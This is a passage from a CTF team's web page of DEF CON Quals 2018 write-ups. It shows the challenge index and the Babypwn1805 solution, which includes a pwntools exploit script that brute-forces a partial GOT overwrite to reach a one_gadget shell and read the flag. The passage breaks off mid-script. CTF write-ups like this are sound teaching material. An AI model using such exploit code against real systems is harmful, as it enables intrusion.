<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>DEFCON CTF QUALS 2018 - Write ups &#183; mhackeroni</title><meta name=title content="DEFCON CTF QUALS 2018 - Write ups &#183; mhackeroni"><meta name=description content="This is the collection of writeups for the DEF CON Quals 2018 by the mhackeroni team."><link rel=canonical href=https://mhackeroni.it/writeups/2018-05-20-defconctfquals-2018-all-writeups/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1d8c7618f0ef6623fd6ebffc2988f58f128a919c43d2ed5d99a0621768c50d3ec37bd1e02b3eb119ba92bc64d53422281addaaa107a57202376dbd6a14e2e50e.css integrity="sha512-HYx2GPDvZiP9br/8KYj1jxKKkZxD0u1dmaBiF2jFDT7De9HgKz6xGbqSvGTVNCIoGt2qoQelcgI3bb1qFOLlDg=="><script type=text/javascript src=/js/appearance.min.2a7f28406ff67c2e3fedcfa49ff1dc78cca5f4b2ace4618a279f94d3fd241566af610abcf38bb98ec3f039afc0acbb3c27e9eced17e4a072f1a98e18a628ec7e.js integrity="sha512-Kn8oQG/2fC4/7c+kn/HceMyl9LKs5GGKJ5+U0/0kFWavYQq884u5jsPwOa/ArLs8J+ns7RfkoHLxqY4Ypijsfg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://mhackeroni.it/writeups/2018-05-20-defconctfquals-2018-all-writeups/"><meta property="og:site_name" content="mhackeroni"><meta property="og:title" content="DEFCON CTF QUALS 2018 - Write ups"><meta property="og:description" content="This is the collection of writeups for the DEF CON Quals 2018 by the mhackeroni team."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2018-05-20T00:00:00+00:00"><meta property="article:modified_time" content="2018-05-20T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="DEFCON CTF QUALS 2018 - Write ups"><meta name=twitter:description content="This is the collection of writeups for the DEF CON Quals 2018 by the mhackeroni team."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"DEFCON CTF QUALS 2018 - Write ups","headline":"DEFCON CTF QUALS 2018 - Write ups","description":"This is the collection of writeups for the DEF CON Quals 2018 by the mhackeroni team.","inLanguage":"en","url":"https:\/\/mhackeroni.it\/writeups\/2018-05-20-defconctfquals-2018-all-writeups\/","author":{"@type":"Person","name":"mhackeroni"},"copyrightYear":"2018","dateCreated":"2018-05-20T00:00:00\u002b00:00","datePublished":"2018-05-20T00:00:00\u002b00:00","dateModified":"2018-05-20T00:00:00\u002b00:00","mainEntityOfPage":"true","wordCount":"17140"}]</script><meta name=author content="mhackeroni"><link href=https://bsky.app/profile/mhackeroni.bsky.social rel=me><link href=https://www.facebook.com/mhackeroni rel=me><link href=https://github.com/mhackeroni/ rel=me><link href=https://www.linkedin.com/company/mhackeroni-inc/ rel=me><link href=https://x.com/mhackeroni rel=me><link href=https://www.youtube.com/@mhackeroni rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>mhackeroni</span>
<img src=/mhackeroni-stylized-square.webp width=1024 height=1024 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt=mhackeroni></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">mhackeroni</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>News</p></a><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Writeups</p></a><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Sponsors>Sponsors</p></a><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="ðŸ“·  Photo Gallery">Gallery</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>News</p></a></li><li class=mt-1><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Writeups</p></a></li><li class=mt-1><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Sponsors>Sponsors</p></a></li><li class=mt-1><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="ðŸ“·  Photo Gallery">Gallery</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">DEFCON CTF QUALS 2018 - Write ups</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2018-05-20T00:00:00+00:00>20 May 2018</time><span class="px-2 text-primary-500">&#183;</span><span>17140 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">81 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p>This is the collection of writeups for the DEF CON Quals 2018 by the mhackeroni team.</p><h2 class="relative group">Index<div id=index class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#index aria-label=Anchor>#</a></span></h2><p><a href=#adamtune>Adamtune</a> - <a href=#babypwn1805>Babypwn1805</a> - <a href=#bitflipper>Bitflipper</a> - <a href=#ddtek-preview>Ddtek: Preview</a> - <a href=#easy-pisy>Easy Pisy</a> - <a href=#elastic-cloud-compute>Elastic Cloud Compute</a> - <a href=#elf-crumble>ELF Crumble</a> - <a href=#exzendtential-crisis>Exzendtential-crisis</a> - <a href=#flagsifier>Flagsifier</a> - <a href=#geckome>Geckome</a> - <a href=#ghettohackers-throwback>Ghettohackers: Throwback</a> - <a href=#its-a-me>It&rsquo;s-a me!</a> - <a href=#note-oriented-programming>Note Oriented Programming</a> - <a href=#official>Official</a> - <a href=#php-eval-white-list>PHP Eval White-List</a> - <a href=#ps-secure>Ps-secure</a> - <a href=#race-wars>Race Wars</a> - <a href=#sbva>Sbva</a> - <a href=#shellql>Shellql</a> - <a href=#techsupport>TechSupport</a> - <a href=#www>WWW</a> - <a href=#you-already-know>You Already Know</a></p><h4 class="relative group"><a href=#disqus_thread>Comments section</a><div id=comments-section class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#comments-section aria-label=Anchor>#</a></span></h4><h2 class="relative group">Adamtune<div id=adamtune class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#adamtune aria-label=Anchor>#</a></span></h2><p>Hey folks! We really wanted to write-up this challenge for you &ndash; but we decided to let Adam DoupÃ© personally explain it instead.</p><p><a href=https://youtu.be/3-4cnyswp4w target=_blank>https://youtu.be/3-4cnyswp4w</a></p><h2 class="relative group">Babypwn1805<div id=babypwn1805 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#babypwn1805 aria-label=Anchor>#</a></span></h2><p>Reading the provided C source file we found the two stack based 1024 bytes buffer overflow and the &ldquo;write 8 bytes in a position relative to the bss asdf variable&rdquo; possibility with the second read.</p><p>At first we tried using the stack buffer overflow to ovewrite last byte of the pointer to the name string of the program. We discovered leaking the env that there was a preloaded custom libc, probably different each time.</p><p>Second step was to going backwards in the bss writing only 1 byte, trying to find where the entry for the read is on the GOT. Overwriting the LSB we manage to call different functions when the offset is -56 from the variable in bss.</p><p>Then we setup a bruteforce of the last two bytes of the read GOT entry, trying to hit a one_gadget (single address to call <code>execv("/bin/sh/")</code>).</p><p>We found that a few addresses returned some error related to <code>/bin/sh</code> having the wrong parameters, so we did another bruteforce, this time trying to jump few bytes before or after those addresses that returned a good output.</p><p>We managed to execute the <code>echo</code> command provided, so we refined the payload to cat the flag.</p><h3 class="relative group">Exploit (final iteration)<div id=exploit-final-iteration class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit-final-iteration aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>__future__</span> <span class=kn>import</span> <span class=n>print_function</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>randint</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>signal</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s1>&#39;e4771e24.quals2018.oooverflow.io&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span>  <span class=mi>31337</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>signal_handler</span><span class=p>(</span><span class=n>signal</span><span class=p>,</span> <span class=n>frame</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;You pressed Ctrl+C!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>signal</span><span class=o>.</span><span class=n>signal</span><span class=p>(</span><span class=n>signal</span><span class=o>.</span><span class=n>SIGINT</span><span class=p>,</span> <span class=n>signal_handler</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Press Ctrl+C&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>challenge</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>solution</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>n</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>candidate</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>candidate</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>candidate</span>
</span></span><span class=line><span class=cl>        <span class=n>candidate</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow2</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;&lt;ip of our leet server&gt;&#34;</span><span class=p>,</span><span class=mi>13337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2> </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>magics</span><span class=o>=</span><span class=p>[</span><span class=mh>0x782a</span><span class=p>,</span><span class=mh>0x1cbe</span><span class=p>,</span><span class=mh>0xa821</span><span class=p>,</span><span class=mh>0x580e</span><span class=p>,</span><span class=mh>0x6372</span><span class=p>,</span><span class=mh>0x6fc3</span><span class=p>,</span><span class=mh>0x5463</span><span class=p>,</span><span class=mh>0x8076</span><span class=p>,</span><span class=mh>0x7818</span><span class=p>,</span><span class=mh>0x834</span><span class=p>,</span><span class=mh>0x2812</span><span class=p>,</span><span class=mh>0x4aa8</span><span class=p>,</span><span class=mh>0x7fc7</span><span class=p>,</span><span class=mh>0x4019</span><span class=p>,</span><span class=mh>0x6bb2</span><span class=p>,</span><span class=mh>0x4bba</span><span class=p>,</span><span class=mh>0x2ff4</span><span class=p>,</span><span class=mh>0x206e</span><span class=p>,</span><span class=mh>0x6078</span><span class=p>,</span><span class=mh>0x2ff7</span><span class=p>,</span><span class=mh>0x6037</span><span class=p>,</span><span class=mh>0x5fc7</span><span class=p>,</span><span class=mh>0x181d</span><span class=p>,</span><span class=mh>0x4075</span><span class=p>,</span><span class=mh>0x5be1</span><span class=p>,</span><span class=mh>0x9ff6</span><span class=p>,</span><span class=mh>0x981e</span><span class=p>,</span><span class=mh>0x9bdc</span><span class=p>,</span><span class=mh>0x3fff</span><span class=p>,</span><span class=mh>0x7826</span><span class=p>,</span><span class=mh>0x581f</span><span class=p>,</span><span class=mh>0x4aac</span><span class=p>,</span><span class=mh>0x781b</span><span class=p>,</span><span class=mh>0x1ee5</span><span class=p>,</span><span class=mh>0x11d2</span><span class=p>,</span><span class=mh>0x7d78</span><span class=p>,</span><span class=mh>0xed9</span><span class=p>,</span><span class=mh>0x46e7</span><span class=p>,</span><span class=mh>0xa01d</span><span class=p>,</span><span class=mh>0x701d</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>funziona</span><span class=o>=</span><span class=p>[</span><span class=mh>0x280d</span><span class=p>,</span><span class=mh>0x2807</span><span class=p>,</span><span class=mh>0xa02e</span><span class=p>,</span><span class=mh>0x581d</span><span class=p>,</span><span class=mh>0x1808</span><span class=p>,</span><span class=mh>0xa02e</span><span class=p>,</span><span class=mh>0x11e5</span><span class=p>,</span><span class=mh>0x808b</span><span class=p>,</span><span class=mh>0x607d</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connect</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>conn</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Challenge: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>challenge</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;n: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># print(&#39;Solving challenge: &#34;{}&#34;, n: {}&#39;.format(challenge, n))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solution</span> <span class=o>=</span> <span class=n>solve_pow2</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(&#39;Solution: {} -&gt; {}&#39;.format(solution, pow_hash(challenge, solution)))</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>solution</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Go</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>connect</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>conn</span><span class=o>.</span><span class=n>clean_and_log</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>56</span><span class=p>))</span><span class=c1>#read@GOT</span>
</span></span><span class=line><span class=cl>                <span class=c1># conn.send(p64(2**64 - 88))#read@</span>
</span></span><span class=line><span class=cl>                <span class=c1># randPart = randint(-0x18,0x18)</span>
</span></span><span class=line><span class=cl>                <span class=c1># currentMagic = random.choice(magics) + randPart</span>
</span></span><span class=line><span class=cl>                <span class=n>currentMagic</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>funziona</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Current &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>currentMagic</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p16</span><span class=p>(</span><span class=n>currentMagic</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=c1># conn.send(p64(0x7ffff7af1cde))</span>
</span></span><span class=line><span class=cl>                <span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;echo -n ZIOPANEFUNZIONA;cat ../home/flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>resp</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Go</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1># if (len(resp)==0):</span>
</span></span><span class=line><span class=cl>                <span class=c1>#     conn.sendline(&#39;uname -a;echo -n &#34;LODODIO&#34;;&#39;)</span>
</span></span><span class=line><span class=cl>                <span class=c1># else:</span>
</span></span><span class=line><span class=cl>                <span class=c1>#     continue</span>
</span></span><span class=line><span class=cl>                <span class=c1># res = conn.recvuntil(&#34;Go\n&#34;)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=s2>&#34;Go</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=ow>in</span> <span class=n>resp</span> <span class=p>):</span>
